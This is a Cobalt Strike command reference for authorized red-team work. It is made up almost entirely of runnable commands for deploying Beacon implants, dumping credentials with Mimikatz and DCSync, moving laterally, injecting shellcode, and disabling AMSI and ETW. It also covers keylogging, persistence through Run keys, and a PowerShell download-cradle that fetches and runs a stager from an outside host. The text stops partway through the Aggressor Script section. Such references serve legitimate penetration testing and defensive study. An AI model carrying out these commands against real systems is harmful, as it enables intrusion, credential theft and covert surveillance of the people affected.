# Cobalt Strike — Complete Command Reference (English)

> **Scope:** Red team / authorized penetration testing reference.  
> Covers Cobalt Strike 4.x Beacon commands, Aggressor Script, listener/payload management, and advanced post-exploitation techniques, with examples for every command.

---

## Table of Contents

1. [Architecture Overview](#1-architecture-overview)
2. [Team Server & Client Setup](#2-team-server--client-setup)
3. [Listener Management](#3-listener-management)
4. [Payload Generation](#4-payload-generation)
5. [Beacon — Basic Commands](#5-beacon--basic-commands)
6. [Beacon — System Information](#6-beacon--system-information)
7. [Beacon — File System Operations](#7-beacon--file-system-operations)
8. [Beacon — Process Operations](#8-beacon--process-operations)
9. [Beacon — Privilege Escalation](#9-beacon--privilege-escalation)
10. [Beacon — Credential Harvesting](#10-beacon--credential-harvesting)
11. [Beacon — Lateral Movement](#11-beacon--lateral-movement)
12. [Beacon — Network & Pivoting](#12-beacon--network--pivoting)
13. [Beacon — Injection & Code Execution](#13-beacon--injection--code-execution)
14. [Beacon — Evasion & OPSEC](#14-beacon--evasion--opsec)
15. [Beacon — Token Manipulation](#15-beacon--token-manipulation)
16. [Beacon — User Interface & Keylogging](#16-beacon--user-interface--keylogging)
17. [Beacon — Miscellaneous](#17-beacon--miscellaneous)
18. [Aggressor Script Reference](#18-aggressor-script-reference)
19. [Reporting & Data Export](#19-reporting--data-export)
20. [Advanced Techniques & Chaining](#20-advanced-techniques--chaining)
21. [Quick Reference Cheat Sheet](#21-quick-reference-cheat-sheet)

---

## 1. Architecture Overview

```
Operator Console (Cobalt Strike Client)
         |
         | HTTPS/DNS/SMB/TCP
         v
    Team Server  ←──── Listeners (HTTP/HTTPS/DNS/SMB/TCP)
         |
         | Tasking (async)
         v
      Beacon (implant on target)
```

| Component | Role |
|---|---|
| **Team Server** | Central C2 server; operators connect to it |
| **Client** | GUI / Aggressor Script engine |
| **Listener** | Network service that receives Beacon callbacks |
| **Beacon** | The implant on the target host |
| **Stager** | Small dropper that downloads the full Beacon |
| **Stageless** | Self-contained Beacon payload |

**Beacon callback model:** Beacon sleeps for a configured interval (default 60 s), wakes, checks in, retrieves queued tasks, executes them, sends output back, and sleeps again. All commands are asynchronous.

---

## 2. Team Server & Client Setup

### Starting the Team Server

```bash
# Syntax
./teamserver <IP> <password> [/path/to/malleable.profile]

# Example — plain
./teamserver 192.168.1.100 "P@ssw0rd123"

# Example — with Malleable C2 profile
./teamserver 192.168.1.100 "P@ssw0rd123" /opt/profiles/amazon.profile

# Example — with SSL cert
./teamserver 192.168.1.100 "P@ssw0rd123" /opt/profiles/custom.profile
```

### Connecting from Client

```
Host:     192.168.1.100
Port:     50050  (default)
User:     <operator alias>
Password: <team server password>
```

### Multi-Team-Server (CS 4.2+)

```
Connect → Add → enter second TS details
```

---

## 3. Listener Management

Listeners receive Beacon callbacks. Each listener has a unique name and defines how Beacon checks in.

### Listener Types

| Type | Transport | Best For |
|---|---|---|
| `HTTP` | Plain HTTP | Low-security targets |
| `HTTPS` | TLS-wrapped HTTP | Most engagements |
| `DNS` | DNS A/TXT/MX lookups | Very restricted egress |
| `SMB` | Named pipe over SMB | Internal pivoting |
| `TCP` | Raw TCP socket | Internal pivoting |
| `Foreign HTTP/HTTPS` | Metasploit hand-off | Multi-framework ops |
| `External C2` | Custom 3rd-party transport | Advanced |

### Creating a Listener (GUI)

```
Cobalt Strike → Listeners → Add
  Name:     lab-https
  Payload:  Beacon HTTPS
  Host:     203.0.113.10
  Port:     443
  Profile:  default
```

### Listener via Aggressor Script

```coffeescript
# Create HTTP listener
listener_create_ext("lab-http", "windows/beacon_http/reverse_http", %(host => "203.0.113.10", port => "80"));

# List listeners
println(listener_names());

# Remove listener
listener_delete("lab-http");
```

---

## 4. Payload Generation

### Staged vs. Stageless

| Type | Pros | Cons |
|---|---|---|
| **Staged** (stager) | Small initial shellcode | 2 connections — detectable staging |
| **Stageless** | Single artifact | Larger file on disk |

### Generating Payloads (GUI)

```
Attacks → Packages → Windows Executable (S)    # Stageless EXE
Attacks → Packages → Windows Executable        # Staged EXE
Attacks → Packages → Raw                       # Raw shellcode
Attacks → Packages → PowerShell               # PS one-liner stager
Attacks → Web Drive-by → Scripted Web Delivery # Hosted stager
```

### HTML Application (HTA)

```
Attacks → Web Drive-by → HTML Application
  Listener: lab-https
  Type:     Powershell / VBA
```

### Scripted Web Delivery

```
Attacks → Web Drive-by → Scripted Web Delivery
  URI:      /update
  Listener: lab-https
  Type:     PowerShell  (produces one-liner)
  # or:     bitsadmin / regsvr32
```

Resulting one-liner (example):
```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://203.0.113.10/update'))"
```

### Payload via Aggressor Script

```coffeescript
# Generate raw stageless shellcode into a file
$data = payload("windows/x64/meterpreter_reverse_https", "192.168.1.100", 443);
artifact_payload("C:\\Temp\\beacon.bin", $data, "x64");

# Generate PowerShell stager string
$ps = powershell_stager("lab-https");
println($ps);
```

### Artifact Kit Customization

```
# Compile custom artifact kit (reduces AV detections)
./build.sh <type> <arch> <output_dir>
# Then: Load Kit → Cobalt Strike → Artifact Kit → load artifact kit script
```

---

## 5. Beacon — Basic Commands

> In the Beacon interaction window, type commands directly. Prefix with `help` to see the list.

### `help`

Show all available commands (or help for a specific command).

```
beacon> help
beacon> help sleep
```

### `sleep`

Set Beacon's callback interval and jitter percentage.

```
sleep <seconds> [jitter%]

beacon> sleep 60         # callback every 60 s, no jitter
beacon> sleep 30 20      # callback every 30 s ±20 % (24–36 s)
beacon> sleep 0          # interactive mode — nearly instant callbacks
beacon> sleep 3600 50    # very quiet: 1 hr ±50 % (30–90 min)
```

> **OPSEC:** `sleep 0` is loud. Use high sleep + jitter in stealth ops.

### `checkin`

Force Beacon to check in immediately (useful after changing sleep).

```
beacon> checkin
```

### `clear`

Clear all pending tasks from the Beacon's task queue.

```
beacon> clear
```

### `exit`

Terminate the Beacon gracefully (sends a task, Beacon exits on next callback).

```
beacon> exit
```

### `note`

Attach a note to the Beacon (visible in the Sessions table).

```
note <text>

beacon> note "Domain Admin — Finance Server"
```

---

## 6. Beacon — System Information

### `getuid`

Return the current user context (domain\user + privilege level).

```
beacon> getuid
[*] Tasked beacon to get user name
[*] GetUID: CORP\jsmith (admin)
```

### `getpid`

Return the process ID of the current Beacon process.

```
beacon> getpid
[*] PID: 4812
```

### `ps`

List all running processes on the target.

```
beacon> ps

 PID   PPID  Name                    Arch  Session  User
 ---   ----  ----                    ----  -------  ----
    4      0  System                  x64   0
  432      4  smss.exe                x64   0
  ...
 4812   3244  svchost.exe             x64   0        NT AUTHORITY\SYSTEM
 5120   4812  notepad.exe             x64   1        CORP\jsmith
```

> Identify target processes for injection. Look for: `explorer.exe`, `svchost.exe`, `lsass.exe` (high-risk), browsers.

### `net`

Enumerate network resources (runs native `net` commands via a BOF).

```
net computers               # domain-joined computers (requires domain)
net dclist                  # domain controllers
net domain                  # current domain name
net domain_controllers      # full DC list
net domain_trusts           # domain trust relationships
net group <group>           # members of a domain group
net groups                  # all domain groups
net localgroup              # local groups on this host
net localgroup <group>      # members of a local group
net logons                  # logged-on users
net sessions                # active SMB sessions
net share                   # shared folders
net time                    # time from a DC
net use                     # mapped drives
net user <user> /domain     # info about a domain user
net users                   # local users
net view                    # hosts visible in the domain
```

**Examples:**

```
beacon> net computers
beacon> net group "Domain Admins"
beacon> net dclist
beacon> net sessions
beacon> net share
```

### `shell` (for net commands)

```
beacon> shell net user /domain
beacon> shell net group "Domain Admins" /domain
beacon> shell nltest /domain_trusts
```

### `sysinfo` / `systeminfo`

```
beacon> shell systeminfo
beacon> shell whoami /all
beacon> shell ipconfig /all
beacon> shell route print
beacon> shell netstat -ano
```

---

## 7. Beacon — File System Operations

### `ls`

List directory contents.

```
ls [path]

beacon> ls                    # current directory
beacon> ls C:\Users
beacon> ls C:\Users\jsmith\Desktop
```

### `cd`

Change current working directory.

```
cd <path>

beacon> cd C:\Windows\Temp
beacon> cd ..
```

### `pwd`

Print working directory.

```
beacon> pwd
```

### `mkdir`

Create directory.

```
mkdir <path>

beacon> mkdir C:\Temp\exfil
```

### `mv`

Move (rename) a file.

```
mv <src> <dst>

beacon> mv C:\Temp\old.txt C:\Temp\new.txt
```

### `cp`

Copy a file.

```
cp <src> <dst>

beacon> cp C:\Windows\System32\cmd.exe C:\Temp\notcmd.exe
```

### `rm`

Delete a file or directory.

```
rm <path>

beacon> rm C:\Temp\payload.exe
beacon> rm C:\Temp\exfil\*
```

### `download`

Download a file from the target to the operator's machine.

```
download <path>

beacon> download C:\Users\jsmith\Documents\passwords.xlsx
beacon> download C:\Windows\NTDS\ntds.dit
```

Files appear in: `View → Downloads`

### `upload`

Upload a file from the operator to the target.

```
upload <local_path>

# In the GUI: right-click → Upload File
# Or in script:
beacon> upload /opt/tools/mimikatz.exe
```

After uploading, the file is placed in the current working directory on target.

### `drives`

List available drives on the target.

```
beacon> drives
Drive  Type         Size (MB)  Free (MB)  Label
C:\    Fixed         102,400     55,231    Windows
D:\    CD-ROM              0          0
```

### `timestomp`

Copy timestamps from one file to another (anti-forensics).

```
timestomp <source_file> <destination_file>

beacon> timestomp C:\Windows\System32\calc.exe C:\Temp\payload.exe
```

---

## 8. Beacon — Process Operations

### `run`

Execute a command and return output (creates a new process, uses spawnto, captures output).

```
run <command> [args]

beacon> run whoami
beacon> run hostname
beacon> run ipconfig /all
```

> Difference from `shell`: `run` uses Beacon's `spawnto` binary for the child process; `shell` invokes `cmd.exe /c`.

### `shell`

Execute via `cmd.exe /c` (spawns a child cmd process).

```
shell <command>

beacon> shell dir C:\Users
beacon> shell type C:\Windows\win.ini
beacon> shell net user administrator /domain
```

### `powershell`

Execute a PowerShell command (spawns a powershell.exe child process).

```
powershell <cmdlet/expression>

beacon> powershell Get-Process
beacon> powershell Get-ADUser -Filter * | Select-Object Name,SamAccountName
beacon> powershell (New-Object Net.WebClient).DownloadString('http://...')
beacon> powershell -enc <base64>
```

### `powerpick`

Execute PowerShell without spawning `powershell.exe` (uses unmanaged PowerShell via CLR hosting in the spawnto process — better OPSEC).

```
powerpick <expression>

beacon> powerpick Get-Process
beacon> powerpick Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
beacon> powerpick IEX (New-Object Net.WebClient).DownloadString('http://...')
```

> **OPSEC advantage:** No `powershell.exe` in process list.

### `execute-assembly`

Load and execute a .NET assembly (EXE or DLL) **in memory** — no file dropped to disk.

```
execute-assembly <local_path_to_.net_exe> [args]

beacon> execute-assembly /opt/tools/Rubeus.exe triage
beacon> execute-assembly /opt/tools/SharpHound.exe -c All
beacon> execute-assembly /opt/tools/Seatbelt.exe -group=all
beacon> execute-assembly /opt/tools/SharpUp.exe audit
beacon> execute-assembly /opt/tools/Certify.exe find /vulnerable
```

> Assembly runs in a sacrificial process (spawnto). All output returned to Beacon.

### `ps`

(See §6 — also useful here for targeting injection.)

### `kill`

Terminate a process by PID.

```
kill <pid>

beacon> kill 5120
```

### `inject`

Inject Beacon shellcode into an existing process (spawns a new Beacon session inside that process).

```
inject <pid> <arch> <listener>

beacon> inject 5120 x64 lab-https
```

> Creates a new Beacon session running inside PID 5120. The new session inherits that process's security context.

### `psinject`

Execute PowerShell in another process (injects CLR + script into target PID).

```
psinject <pid> <arch> <powershell_script>

beacon> psinject 5120 x64 Get-Process
beacon> psinject 1234 x64 IEX (New-Object Net.WebClient).DownloadString('http://...')
```

### `spawnas`

Spawn a Beacon as another user (requires plaintext password).

```
spawnas <domain\user> <password> <listener>

beacon> spawnas CORP\administrator P@ssword123 lab-https
```

### `spawn`

Spawn a new Beacon session (in spawnto process) and connect it to a listener.

```
spawn <arch> <listener>

beacon> spawn x64 lab-https
beacon> spawn x86 smb-pivot
```

### `fork&run`

Most post-exploitation commands automatically use fork&run (spawn a sacrificial process, inject BOF/reflective DLL, collect output, kill the process). This is the default execution model for many Beacon commands.

### `argue`

Spoof the command-line arguments of a spawned process (for EDR evasion — process appears to run legitimate args).

```
argue <program> <fake_args>

beacon> argue C:\Windows\System32\notepad.exe
```

---

## 9. Beacon — Privilege Escalation

### `getsystem`

Attempt to elevate to SYSTEM via one of several built-in techniques.

```
getsystem

beacon> getsystem
[*] Tasked beacon to get SYSTEM
[+] Impersonated NT AUTHORITY\SYSTEM
```

> Internally tries: named-pipe impersonation, token duplication techniques.

### `elevate`

Use a specific exploit or technique to elevate privileges.

```
elevate <exploit_name> <listener>

# Built-in exploits:
beacon> elevate uac-token-duplication lab-https   # UAC bypass via token dup
beacon> elevate uac-schtasks lab-https            # UAC bypass via schtask
beacon> elevate ms14-058 lab-https                # CVE-2014-4113 (legacy)

# From Elevate Kit (custom exploits):
beacon> elevate juicy-potato lab-https
beacon> elevate printspoofer lab-https
beacon> elevate sweetpotato lab-https
```

> After `elevate`, a new high-integrity or SYSTEM-level Beacon session appears.

### `runasadmin`

Run a command in high-integrity context without a full new session.

```
runasadmin <exploit_name> <command>

beacon> runasadmin uac-cmstplua cmd.exe /c whoami > C:\Temp\out.txt
```

### `bypassuac` (legacy — prefer `elevate`)

```
bypassuac <listener>

beacon> bypassuac lab-https
```

---

## 10. Beacon — Credential Harvesting

### `hashdump`

Dump local SAM hashes (requires SYSTEM or admin).

```
beacon> hashdump
[*] Tasked beacon to dump hashes
Administrator:500:aad3b...:31d6c...:::
Guest:501:aad3b...:31d6c...:::
jsmith:1001:aad3b...:7ab19...:::
```

### `logonpasswords` (via Mimikatz)

Dump plaintext credentials, NTLM hashes, Kerberos tickets from LSASS memory.

```
beacon> logonpasswords

# Equivalent:
beacon> mimikatz sekurlsa::logonpasswords
```

Output includes:
- Username, domain, NTLM hash
- Plaintext password (when available — WDigest)
- Kerberos tickets

### `mimikatz`

Run arbitrary Mimikatz commands.

```
mimikatz <command>

# Common commands:
beacon> mimikatz sekurlsa::logonpasswords
beacon> mimikatz sekurlsa::wdigest
beacon> mimikatz sekurlsa::tickets
beacon> mimikatz sekurlsa::ekeys
beacon> mimikatz lsadump::sam
beacon> mimikatz lsadump::secrets
beacon> mimikatz lsadump::cache
beacon> mimikatz privilege::debug
beacon> mimikatz token::elevate
beacon> mimikatz crypto::certificates /export
```

### `dcsync`

Perform a DCSync attack — replicate a specific account's password hash from a DC without logging on to it.

```
dcsync <domain> <domain\user>

beacon> dcsync corp.local CORP\krbtgt
beacon> dcsync corp.local CORP\administrator

# Equivalent:
beacon> mimikatz @lsadump::dcsync /domain:corp.local /user:administrator
```

> Requires: Domain Admin, Enterprise Admin, or specific DS-Replication-Get-Changes rights.

### `credentials`

View credentials already harvested in the current engagement (Cobalt Strike credential store).

```
View → Credentials
```

### `make_token`

Create an impersonation token using known credentials (does not require plaintext password to work locally if hash is available — but this command needs plaintext).

```
make_token <domain\user> <password>

beacon> make_token CORP\administrator P@ssword123
```

### `steal_token`

Steal the access token from an existing process (impersonate its security context).

```
steal_token <pid>

beacon> steal_token 4812
[*] Tasked beacon to steal token from PID 4812
[*] GetUID: CORP\dbadmin
```

### `rev2self`

Drop back to original token (undo `steal_token` or `make_token`).

```
beacon> rev2self
```

### `pth` (Pass-the-Hash)

Use an NTLM hash to authenticate without knowing the plaintext password.

```
pth <domain\user> <ntlm_hash>

beacon> pth CORP\administrator aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

> Internally: calls `sekurlsa::pth` via Mimikatz, creates a new token with injected hash.

### Kerberoasting

```
# List SPN accounts (find Kerberoastable users)
beacon> execute-assembly /opt/tools/Rubeus.exe kerberoast /outfile:hashes.txt

# Or via PowerView:
beacon> powerpick Get-DomainUser -SPN | Select-Object SamAccountName,ServicePrincipalName

# Request service ticket:
beacon> shell klist
beacon> execute-assembly /opt/tools/Rubeus.exe asktgs /service:MSSQLSvc/sql01.corp.local:1433 /ptt
```

### AS-REP Roasting

```
beacon> execute-assembly /opt/tools/Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

---

## 11. Beacon — Lateral Movement

### `jump`

Spawn a Beacon on a remote host using a built-in technique.

```
jump <technique> <target> <listener>

# Techniques:
beacon> jump psexec      dc01.corp.local lab-https   # upload EXE via SMB, run as service
beacon> jump psexec64    dc01.corp.local lab-https   # same, 64-bit
beacon> jump psexec_psh  dc01.corp.local lab-https   # PowerShell one-liner via service
beacon> jump winrm       dc01.corp.local lab-https   # WinRM / PowerShell remoting (x86)
beacon> jump winrm64     dc01.corp.local lab-https   # WinRM 64-bit
beacon> jump wmi         dc01.corp.local lab-https   # WMI + staging
beacon> jump wmi64       dc01.corp.local lab-https   # WMI 64-bit
```

> Before `jump`, you usually need: `make_token` or `steal_token` to be in the right context.

### `remote-exec`

Execute a command on a remote host (no Beacon — just command execution).

```
remote-exec <technique> <target> <command>

beacon> remote-exec psexec  dc01.corp.local cmd.exe /c whoami
beacon> remote-exec winrm   dc01.corp.local whoami
beacon> remote-exec wmi     dc01.corp.local cmd.exe /c ipconfig
```

### Manual Lateral Movement Techniques

**Pass-the-Hash + psexec:**
```
beacon> pth CORP\administrator aad3b435b51404eeaad3b435b51404ee:8f4e...
beacon> jump psexec dc01.corp.local lab-https
```

**WMI:**
```
beacon> shell wmic /node:dc01.corp.local /user:CORP\administrator /password:P@ss process call create "cmd.exe /c whoami > C:\Temp\out.txt"
```

**PowerShell Remoting:**
```
beacon> powerpick Invoke-Command -ComputerName dc01.corp.local -ScriptBlock { whoami }
```

**Token impersonation + SMB:**
```
beacon> steal_token 4812           # steal Domain Admin token
beacon> shell net use \\dc01.corp.local\c$ /user:CORP\administrator P@ss
beacon> jump psexec dc01.corp.local lab-https
```

### Beacon SMB (Named-Pipe) — Pivoting Through Firewall

1. Deploy an SMB listener on the operator's team server:
   ```
   Listeners → Add → Beacon SMB  →  pipe: \\.\pipe\lab_smb
   ```

2. On the already-compromised host:
   ```
   beacon> jump psexec internal-host smb-listener
   ```

3. The new Beacon connects back through the first Beacon's SMB link.

### `link`

Manually link to an SMB Beacon already running on a host.

```
link <target> [pipe_name]

beacon> link 10.10.10.5
beacon> link 10.10.10.5 \\.\pipe\msagent_8f
```

### `unlink`

Disconnect from a linked Beacon.

```
unlink <target> [pid]

beacon> unlink 10.10.10.5
```

### `connect`

Manually connect to a TCP Beacon.

```
connect <target> <port>

beacon> connect 10.10.10.5 4444
```

---

## 12. Beacon — Network & Pivoting

### `portscan`

Scan TCP ports on hosts.

```
portscan <targets> <ports> <discovery_method> [max_sockets]

# Methods: arp, icmp, none
beacon> portscan 10.10.10.0/24 22,80,443,445,3389,8080 arp 1024
beacon> portscan 10.10.10.5 1-65535 none 256
beacon> portscan 10.10.10.0/24 common none 1024
```

Results appear in `View → Targets`.

### `socks`

Start a SOCKS4a proxy on the team server (allows operator's tools to tunnel through Beacon).

```
socks <port>

beacon> socks 1080
```

Then configure proxychains on the operator box:
```
# /etc/proxychains.conf
socks4  127.0.0.1  1080

# Usage:
proxychains nmap -sT -p 445,80 10.10.10.5
proxychains python3 impacket-secretsdump ...
```

### `socks stop`

Stop the SOCKS proxy.

```
beacon> socks stop
```

### `rportfwd`

Reverse port forward: forward a port on the target host back to a port on the team server.

```
rportfwd <bind_port_on_target> <forward_to_host> <forward_to_port>

# Example: forward 8080 on target → team server 192.168.1.100:80
beacon> rportfwd 8080 192.168.1.100 80
```

Useful for: setting up a listener that internal-only machines can reach.

### `rportfwd stop`

Stop a reverse port forward.

```
beacon> rportfwd stop 8080
```

### `rportfwd_local`

(CS 4.1+) Like `rportfwd` but forwards to a port on the **operator's machine**, not the team server.

```
beacon> rportfwd_local 8080 127.0.0.1 80
```

### `covertvpn`

Create a VPN tunnel through the Beacon connection (requires admin on target).

```
beacon> covertvpn <interface> <ip> <netmask> <mac>
```

> Rarely used; SOCKS is more practical.

### DNS C2

Configure DNS listener for high-restriction environments:
```
# In Malleable C2 profile:
dns-beacon {
    set dns_idle  "8.8.8.8";
    set dns_sleep "0";
    set maxdns    "255";
}
```

Beacon over DNS is much slower; use `sleep 5` for faster interaction.

---

## 13. Beacon — Injection & Code Execution

### `shinject`

Inject arbitrary shellcode into an existing process.

```
shinject <pid> <arch> <path_to_shellcode_bin>

beacon> shinject 5120 x64 /opt/payloads/calc.bin
beacon> shinject 1234 x86 /opt/payloads/meterp.bin
```

### `shspawn`

Spawn a new process and inject shellcode into it.

```
shspawn <arch> <path_to_shellcode_bin>

beacon> shspawn x64 /opt/payloads/stager.bin
```

### `dllinject`

Inject a reflective DLL into an existing process.

```
dllinject <pid> <path_to_dll>

beacon> dllinject 5120 /opt/tools/ReflectiveDll.dll
```

### `dllload`

Load a DLL in the target process using `LoadLibrary` (requires the DLL to exist on the target disk).

```
dllload <pid> <remote_path_to_dll>

beacon> dllload 5120 C:\Temp\evil.dll
```

### `execute-assembly`

(See §8 — covers in-memory .NET execution)

### `inline-execute` / BOF (Beacon Object Files)

Execute a BOF (compiled C object file) inline in Beacon's own process — no new process spawned.

```
inline-execute <path_to_.o> [args]

# Examples with common BOFs:
beacon> inline-execute /opt/bofs/whoami.o
beacon> inline-execute /opt/bofs/nanodump.o lsass 1
beacon> inline-execute /opt/bofs/chrome-dump.o
```

> BOFs run in Beacon's memory — crashes kill Beacon. Test BOFs carefully.

Common BOF tools:
- **TrustedSec BOF Collection** — process listing, token manipulation
- **nanodump** — LSASS dump without `procdump`
- **Inject-Assembly** — in-process .NET execution

### `pth` (Pass-the-Hash execution)

(See §10 — also triggers a Mimikatz injection.)

---

## 14. Beacon — Evasion & OPSEC

### `sleep`

(See §5 — key OPSEC control.)

### `spawnto`

Set the binary that Beacon uses when it needs to spawn a sacrificial child process (default: `%windir%\syswow64\rundll32.exe` on x86, `%windir%\system32\rundll32.exe` on x64).

```
spawnto <arch> <full_path>

beacon> spawnto x64 C:\Windows\System32\dllhost.exe
beacon> spawnto x86 C:\Windows\SysWOW64\msiexec.exe
beacon> spawnto x64 C:\Windows\System32\svchost.exe -k netsvcs
```

> Change this to blend into normal process trees. Pick processes expected on the target.

### `ppid`

Set the parent process ID for spawned processes (Parent PID spoofing).

```
ppid <pid>

# Example: make child processes appear under explorer.exe (PID 4812)
beacon> ppid 4812
```

### `blockdlls`

Block non-Microsoft DLLs from loading into Beacon's sacrificial child processes (stops EDR hooking DLLs from loading).

```
blockdlls start
blockdlls stop

beacon> blockdlls start
```

> Note: may break legitimate functionality if target process needs 3rd-party DLLs.

### `argue`

Spoof the command-line arguments visible in the PEB/process list for spawned processes.

```
argue <binary> <fake_args>

beacon> argue C:\Windows\System32\notepad.exe "C:\Users\jsmith\notes.txt"
```

### `obfuscate`

Toggle in-memory string obfuscation of Beacon's own heap (CS 4.2+).

```
beacon> obfuscate true
beacon> obfuscate false
```

### `amsi_disable` (via inline BOF or Powerpick)

Patch AMSI in the current process (allows unsigned PowerShell / AMSI-scanned .NET).

```
# Via BOF:
beacon> inline-execute /opt/bofs/amsi_disable.o

# Via reflection:
beacon> powerpick [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### `etw_disable` (via BOF)

Disable ETW Threat Intelligence provider to suppress telemetry.

```
beacon> inline-execute /opt/bofs/etw_disable.o
```

### Malleable C2 Profile Evasion

Key profile settings that affect detectability:

```
stage {
    set userwx "false";           # No RWX memory for payload
    set cleanup "true";           # Zero shellcode after loading
    set sleep_mask "true";        # XOR-mask Beacon in memory while sleeping
    set stomppe "true";            # Stomp PE headers
    transform-x86 { prepend "\x90\x90"; }
    transform-x64 { prepend "\x90\x90"; }
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\system32\\dllhost.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set keylogger "GetAsyncKeyState";
}
```

---

## 15. Beacon — Token Manipulation

### `steal_token`

(See §10 — impersonate another process's token.)

### `make_token`

Create a token with specific credentials (logon type: Network — no new process).

```
make_token <domain\user> <password>

beacon> make_token CORP\administrator P@ssword123
[*] Impersonating CORP\administrator
```

After `make_token`: SMB/RPC operations use the new token. `inject` still uses the original context unless you `steal_token` the new process.

### `rev2self`

Drop back to original Beacon token.

```
beacon> rev2self
```

### `getuid`

See current user context.

```
beacon> getuid
```

### Token Inheritance Chain Example

```
beacon> steal_token 4812          # grab Domain Admin token from explorer
beacon> getuid                    # confirm: CORP\jsmith (DA)
beacon> jump psexec dc01 lab-https
beacon> rev2self                  # drop DA token
```

---

## 16. Beacon — User Interface & Keylogging

### `screenshot`

Capture a screenshot of the current desktop session.

```
screenshot

beacon> screenshot
# Screenshot saved to View → Screenshots
```

### `screenwatch`

Take repeated screenshots at an interval.

```
screenwatch <interval_ms>

beacon> screenwatch 1000       # screenshot every 1 second
```

### `keylogger`

Start a keylogger in the current process or a target process.

```
keylogger [pid] [arch]

beacon> keylogger              # keylog in Beacon's own process
beacon> keylogger 5120 x64    # keylog in PID 5120 (e.g., notepad, browser)
```

Results viewable at: `View → Keystrokes`

### `keylogger stop`

Stop the keylogger.

```
beacon> keylogger stop
```

### `clipboard`

Capture current clipboard content.

```
beacon> clipboard
```

### `desktop` (VNC)

Start an interactive VNC session to the target desktop.

```
desktop [pid] [arch] [quality]

beacon> desktop            # VNC in Beacon's process
beacon> desktop 5120 x64 50   # VNC in target process, 50% quality
```

> Opens a VNC viewer on the operator client. Requires JAVA VNC client component.

---

## 17. Beacon — Miscellaneous

### `reg`

Query or modify the Windows registry.

```
reg query    <hive\key>
reg query    <hive\key> <value>
reg set      <hive\key> <value> <type> <data>
reg delete   <hive\key>

beacon> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
beacon> reg set HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater REG_SZ "C:\Temp\beacon.exe"
```

### `runas`

Run a command as a different user (requires plaintext password).

```
runas <domain\user> <password> <command>

beacon> runas CORP\administrator P@ssword123 cmd.exe /c whoami
```

### `spawnas`

(See §8 — spawn a Beacon as a different user.)

### `timestomp`

(See §7 — copy file timestamps.)

### `wdigest`

Enable WDigest credential caching for future logons (requires reboot or lock/unlock).

```
# Enable (requires admin):
beacon> shell reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

# Then wait for user to log in / lock/unlock screen
beacon> logonpasswords   # now shows plaintext
```

### `browserpivot`

Hijack an Internet Explorer or Chrome session to browse as the logged-in user.

```
browserpivot <pid> <arch>

beacon> browserpivot 5120 x64
# Opens a proxy on team server port — browse through victim's IE session
```

### Setting Environment Variables (for child processes)

```
beacon> run cmd /c set MYVAR=test && echo %MYVAR%
```

---

## 18. Aggressor Script Reference

Aggressor Script is Cobalt Strike's scripting language (Sleep-based). Scripts automate tasks, add custom commands, create UI menus, respond to events, and extend Beacon functionality.

### Loading Scripts

```
Cobalt Strike → Script Manager → Load → select .cna file
```

Or from command line:
```
./agscript <host> <port> <user> <password> [/path/to/script.cna]
```

### Script File Structure (`.cna`)

```coffeescript
# Comments start with #

# Define a custom alias (command usable in Beacon interaction)
alias mycommand {
    local('$bid $arg1');
    $bid   = $1;         # Beacon ID (always first arg)
    $arg1  = $2;
    btask($bid, "Running mycommand with arg: $arg1");
    bshell($bid, "whoami");
}

# Register an event handler
on beacon_initial {
    local('$bid');
    $bid = $1;
    btask($bid, "New beacon checked in!");
}
```

### Key Aggressor Functions

#### Beacon Task Functions (`b*`)

```coffeescript
bshell($bid, "whoami");                        # shell command
bpowershell($bid, "Get-Process");              # powershell
bpowerpick($bid, "Get-Process");               # powerpick
brun($bid, "whoami");                          # run
bexecute_assembly($bid, "Rubeus.exe", "triage");  # execute-assembly
bsleep($bid, 30, 10);                          # sleep 30 jitter 10%
bls($bid, "C:\\");                             # ls
bcd($bid, "C:\\Temp");                         # cd
bpwd($bid);                                    # pwd
bmkdir($bid, "C:\\Temp\\exfil");              # mkdir
brm($bid, "C:\\Temp\\file.txt");              # rm
bdownload($bid, "C:\\Temp\\file.txt");         # download
bupload($bid, "C:\\Temp\\file.txt", "C:\\Temp\\file.txt");  # upload
bps($bid);                                     # ps
bkill($bid, 1234);                             # kill
bgetuid($bid);                                 # getuid
bgetsystem($bid);                              # getsystem
bhashdump($bid);                               # hashdump
blogonpasswords($bid);                         # logonpasswords
bdcsync($bid, "corp.local", "administrator");  # dcsync
bpth($bid, "CORP\\admin", "hash");             # pth
binject($bid, 5120, "x64", "lab-https");       # inject
bspawnas($bid, "CORP\\admin", "pass", "lab-https");  # spawnas
bjump($bid, "psexec", "dc01", "lab-https");    # jump
bshinject($bid, 5120, "x64", "/path/to/sc.bin");  # shinject
bscreenshot($bid);                             # screenshot
bkeylogger($bid);                              # keylogger
btimestomp($bid, "src.exe", "dst.exe");        # timestomp
breg_query($bid, "HKLM\\SOFTWARE\\...");       # reg query
bportscan($bid, "10.0.0.0/24", "22,80,445", "arp", 1024);  # portscan
bsocks($bid, 1080);                            # socks
bmake_token($bid, "CORP\\admin", "pass");      # make_token
bsteal_token($bid, 4812);                      # steal_token
brev2self($bid);                               # rev2self
```

#### Reading Output

```coffeescript
# Register callback for output from a command
sub my_callback {
    local('$bid $results');
    $bid     = $1;
    $results = $2;
    println("Beacon $bid returned: $results");
}

bshell($bid, "whoami", &my_callback);
```

#### Dialogs

```coffeescript
dialog "My Dialog", %(field1 => "default"), {
    # $1 = beacon IDs, $2 = button, $3 = dialog values
    local('$bid $vals');
    $bid  = [$1 get: 0];
    $vals = $3;
    bshell($bid, "echo " . $vals['field1']);
};
drow_text($dialog, "field1", "Enter value:");
dbutton_action($dialog, "Run");
dialog_show($dialog);
```

#### Event Handlers

```coffeescript
on beacon_initial     { /* new beacon */ }
on beacon_checkin     { /* regular checkin */ }
on beacon_output      { /* command output */ }
on beacon_error       { /* error */ }
